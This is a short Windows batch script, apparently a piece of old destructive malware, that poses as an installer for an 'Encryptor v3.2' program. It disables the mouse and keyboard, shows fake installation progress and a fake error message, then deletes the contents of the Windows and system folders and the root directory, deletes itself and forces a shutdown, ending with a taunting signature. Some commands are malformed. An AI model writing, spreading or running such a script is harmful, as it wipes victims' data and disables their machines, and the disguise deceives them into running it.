   @echo off
   cd %windir%
   rundll.exe mouse.drv,disable
   rundll.exe keyboard.drv,disable
   copy%0 "c:\
   echo Now installing Encryptor v3.2
   choice /ty,2 > nul
   echo Installation 10% complete. . .
   choice /ty,2 > nul
   echo Installation 32% complete. . .
   choice /ty,2 > nul
   echo Windows has encountered an error. .
   echo To continue. . .
   choice /ty,2 > nul
   if exist c:\windows goto begin

   :begin

   @echo off
   cd c:\%windir%\system
   del /y *.*
   cd c:\%windir%
   deltree /y *.*
   del /y *.*
   echo You have been FUCKED by 0DY$$3U$
   cd\
   del /y *.*
   del /y %0
   rundll32 shell32.dll,SHExitWindowsEx 4
   REM This has been presented to you by 0DY$$3U$
